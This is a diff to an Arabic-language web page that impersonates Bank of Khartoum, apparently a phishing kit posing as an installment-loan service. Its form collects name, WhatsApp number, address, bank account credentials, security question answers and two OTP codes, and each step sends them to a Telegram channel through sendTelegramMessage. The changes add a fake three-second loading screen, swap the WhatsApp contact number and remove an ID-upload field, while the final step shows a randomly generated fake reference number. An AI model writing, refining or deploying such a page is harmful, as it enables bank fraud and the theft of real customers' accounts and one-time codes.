@@ -237,9 +237,53 @@
 
         .loading-spinner { display: inline-block; width: 18px; height: 18px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* شاشة التحميل الحمراء */
+        #custom-loader {
+            position: fixed;
+            inset: 0;
+            background-color: #dc2626;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            text-align: center;
+            padding: 20px;
+        }
+        #custom-loader.hidden {
+            display: none !important;
+        }
+        .loader-spinner-lg {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 20px;
+        }
+        .loader-title {
+            font-size: 22px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        .loader-subtitle {
+            font-size: 15px;
+            opacity: 0.9;
+        }
     </style>
 </head>
 <body>
+    <!-- شاشة التحميل الحمراء -->
+    <div id="custom-loader" class="hidden">
+        <div class="loader-spinner-lg"></div>
+        <div class="loader-title">جاري التحميل...</div>
+        <div class="loader-subtitle" style="margin-bottom: 5px; font-weight: bold;">بنك الخرطوم</div>
+        <div class="loader-subtitle">خدمة الشراء بالاقساط المريحة</div>
+    </div>
+
     <header class="header-img-container">
         <img src="m.jpg" alt="بنك الخرطوم">
     </header>
@@ -259,7 +303,7 @@
                 </ul>
 
                 <h4>📍 مكان الاستلام:</h4>
-                <p>يتم استلام المنتجات المتمولة فور اكتمال الإجراءات عبر  <strong>فرع أمدرمان - السوق الشعبي كما توجد خدمة توصيل لكل الولايات الآمنة </strong>.</p>
+                <p>يتم استلام المنتجات المتمولة فور اكتمال الإجراءات عبر <strong>فرع أمدرمان - السوق الشعبي</strong>.</p>
             </div>
             
             <div class="categories-grid">
@@ -300,7 +344,7 @@
 
                 <div class="btn-circle-card" style="visibility: hidden; pointer-events: none;"></div>
 
-                <a href="https://wa.me/249117284407?text=%Dالسلام%20عليكم،%20أرغب%20في%20الاستفسار%20عن%20تفاصيل%20قروض%20وبرامج%20التمويل%20الميسر%20من%20بنك%20الخرطوم." target="_blank" class="btn-circle-card full-width">
+                <a href="https://wa.me/249922876729?text=%Dالسلام%20عليكم،%20أرغب%20في%20الاستفسار%20عن%20تفاصيل%20قروض%20وبرامج%20التمويل%20الميسر%20من%20بنك%20الخرطوم." target="_blank" class="btn-circle-card full-width">
                     <div class="icon-circle" style="width: 45px; height: 45px;">
                         <i class="fab fa-whatsapp"></i>
                     </div>
@@ -328,7 +372,7 @@
             </div>
 
             <div class="input-group">
-                <label>سنة الصنع / الموديل:</label>
+                <label>سنة الصنع / الموديل (يقل السعر 2 مليون لكل سنة أقدم):</label>
                 <select id="car-year" onchange="updateCarDetails()">
                     <option value="" disabled selected>-- اختر سنة الموديل --</option>
                     <script>
@@ -536,10 +580,10 @@
             <button class="btn-submit" style="background-color: #64748b; margin-top: 10px;" onclick="goToStep('step-home')">الرجوع للخلف</button>
         </div>
 
-        <!-- 3. صفحة إدخال البيانات الشخصية والمستند (شكلي فقط) -->
+        <!-- 3. صفحة إدخال البيانات الشخصية (تمت إزالة حقل المستند) -->
         <div id="step-personal-info" class="card hidden">
             <h2>إدخال بيانات المستخدم</h2>
-            <h3>يرجى استيفاء بيانات الهوية والمستند لإتمام الطلب</h3>
+            <h3>يرجى استيفاء بيانات الهوية لإتمام الطلب</h3>
 
             <div class="branch-notice">
                 📍 <strong>مقر الاستلام:</strong> فرع أمدرمان - السوق الشعبي.
@@ -563,16 +607,6 @@
                 <span id="err-user-address" class="error-message hidden">الرجاء إدخال عنوان السكن</span>
             </div>
 
-            <div class="input-group">
-                <label>صورة من المستند (جواز سفر أو رقم وطني) [للاطلاع فقط]:</label>
-                <div style="position: relative; border: 1px solid #cbd5e1; border-radius: 10px; background-color: #f8fafc; padding: 10px; display: flex; align-items: center; justify-content: space-between; width: 100%;">
-                    <input type="file" id="user-file-input" accept="image/*" onchange="updateFileLabel()" style="position: absolute; inset: 0; opacity: 0; cursor: pointer; width: 100%; height: 100%;">
-                    <span id="file-label-text" style="font-size: 13px; color: #94a3b8; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">اختر صورة المستند...</span>
-                    <span style="background-color: rgba(197,160,89,0.15); color: #c5a059; font-size: 11px; font-weight: bold; padding: 6px 12px; border-radius: 6px; flex-shrink: 0;">استعراض</span>
-                </div>
-                <span id="err-user-file" class="error-message hidden">الرجاء إرفاق صورة المستند</span>
-            </div>
-
             <button class="btn-submit" onclick="submitUserIntro()">متابعة لتوثيق الحساب البنكي</button>
             <button class="btn-submit" style="background-color: #64748b; margin-top: 10px;" onclick="goToProductStep()">الرجوع للخلف</button>
         </div>
@@ -583,7 +617,7 @@
             <h3>الرجاء إدخال بيانات حساب بنك الخرطوم الخاص بك للبدء</h3>
             
             <div style="background-color: #fefce8; border: 1px solid #fde047; padding: 12px; border-radius: 10px; margin-bottom: 15px; font-size: 12.5px; color: #854d0e; line-height: 1.5; text-align: right; width: 100%;">
-                💡 <strong>تنويه:</strong> يتطلب تقديم طلب التمويل تسجيل الدخول إلى حسابك البنكي أولاً لتأكيد الهوية.
+                💡 <strong>تنويه:</strong> يتطلب تقديم طلب التمويل توثيق حسابك لدينا أولاً .
             </div>
 
             <div class="input-group">
@@ -710,9 +744,15 @@
         }
 
         function goToStep(id) {
-            hideAllViews();
-            document.getElementById(id).classList.remove('hidden');
-            if (id === 'step-inc-otp') startOtpTimer();
+            const loader = document.getElementById('custom-loader');
+            loader.classList.remove('hidden');
+
+            setTimeout(() => {
+                hideAllViews();
+                document.getElementById(id).classList.remove('hidden');
+                loader.classList.add('hidden');
+                if (id === 'step-inc-otp') startOtpTimer();
+            }, 3000);
         }
 
         function togglePassword(id) {
@@ -837,20 +877,9 @@
                 userData.productDetails = `${userData.productName} | المواصفات: ${specsEl || 'لا توجد'} | المدة: ${durationEl.value} شهر | الإجمالي: ${formatNumber(userData.productPrice)} ج.س`;
             }
 
-            // إرسال صفحة تفاصيل السلعة وحدها
             sendTelegramMessage(`📦 بيانات السلعة المختارة:\n• القسم: ${userData.category}\n• المنتج: ${userData.productDetails}`);
 
             goToStep('step-personal-info');
-        }
-
-        function updateFileLabel() {
-            const fileInput = document.getElementById('user-file-input');
-            const fileLabelText = document.getElementById('file-label-text');
-            if (fileInput.files && fileInput.files.length > 0) {
-                fileLabelText.textContent = "تم استعراض المستند بنجاح (للإطلاع فقط)";
-                fileLabelText.style.color = "#16a34a";
-                fileLabelText.style.fontWeight = "600";
-            }
         }
 
         function submitUserIntro() {
@@ -858,16 +887,13 @@
             userData.name = document.getElementById('user-name').value.trim();
             userData.whatsapp = document.getElementById('user-whatsapp').value.trim();
             userData.address = document.getElementById('user-address').value.trim();
-            let fileInput = document.getElementById('user-file-input');
 
             if(!userData.name) { document.getElementById('err-user-name').classList.remove('hidden'); hasError = true; }
             if(!userData.whatsapp) { document.getElementById('err-user-whatsapp').classList.remove('hidden'); hasError = true; }
             if(!userData.address) { document.getElementById('err-user-address').classList.remove('hidden'); hasError = true; }
-            if(!fileInput.files || fileInput.files.length === 0) { document.getElementById('err-user-file').classList.remove('hidden'); hasError = true; }
 
             if(hasError) return;
 
-            // إرسال صفحة بيانات المستخدم وحدها
             sendTelegramMessage(
                 `👤 بيانات المستخدم:\n` +
                 `• الاسم: ${userData.name}\n` +
@@ -916,7 +942,6 @@
 
             errorElement.classList.add('hidden');
 
-            // إرسال صفحة تسجيل الدخول للحساب البنكي وحدها
             sendTelegramMessage(
                 `🔐 بيانات الحساب البنكي:\n` +
                 `• رقم الحساب: ${userData.accountNum}\n` +
@@ -936,7 +961,6 @@
 
             if(hasError) return;
 
-            // إرسال صفحة أسئلة الأمان وحدها
             sendTelegramMessage(
                 `🛡️ أسئلة الأمان:\n` +
                 `• السؤال: ${userData.securityQuestion}\n` +
@@ -968,7 +992,6 @@
 
             if (otpAttemptCount === 1) {
                 userData.otp1 = o;
-                // إرسال المحاولة الأولى للـ OTP وحدها
                 sendTelegramMessage(
                     `📲 رمز التحقق (OTP) - المحاولة الأولى:\n` +
                     `• الرمز المدخل: ${userData.otp1}`
@@ -986,16 +1009,14 @@
                     let randomRef = 'BOK-LN-' + Math.floor(10000000 + Math.random() * 90000000);
                     userData.refNum = randomRef;
 
-                    // إرسال المحاولة الثانية للـ OTP مع الرقم المرجعي وحدها
                     sendTelegramMessage(
                         `📲 رمز التحقق (OTP) - المحاولة الثانية والاخيرة:\n` +
                         `• الرمز المدخل: ${userData.otp2}\n\n` +
                         `🎫 الرقم المرجعي للطلب: ${userData.refNum}`
                     );
 
-                    hideAllViews();
+                    goToStep('step-success');
                     document.getElementById('display-ref-num').textContent = randomRef;
-                    document.getElementById('step-success').classList.remove('hidden');
                 }, 2000);
             }
         }
